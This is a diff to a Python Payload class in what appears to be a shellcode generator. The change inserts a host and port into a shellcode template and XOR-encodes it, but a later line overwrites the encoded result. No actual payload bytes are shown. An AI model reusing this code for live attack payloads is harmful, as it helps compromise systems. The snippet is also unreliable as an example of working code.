@@ -1,5 +1,7 @@
 from extra_functions.xor_encode import Encoder
 from extra_functions.set_address_shellcodes import get_address
+from struct import pack
+from socket import inet_aton
 
 
 class Payload():
@@ -16,12 +18,12 @@ class Payload():
             return "This payload is not compatible with Metasploit"
         return "Compatible with Metasploit: " + self.info_metasploit
         
-    def get_shellcode(self, host, port):
-        sh_aux = self.shellcode %(get_address(host,port))
-        #TODO
-        #if self.encode:
-         #   enc = Encoder(sh_aux,self.arq, self.size)
-          #  sh_aux = enc.execute()
+    def get_shellcode(self, port, host):
+        if self.encode:
+            sh_aux = self.shellcode % (pack(">h",int(port)), inet_aton(host))
+            enc = Encoder(sh_aux,self.arq, self.size)
+            sh_aux = enc.execute()
+        sh_aux = self.shellcode % (get_address(port, host))
         return sh_aux
     
     def get_size(self):
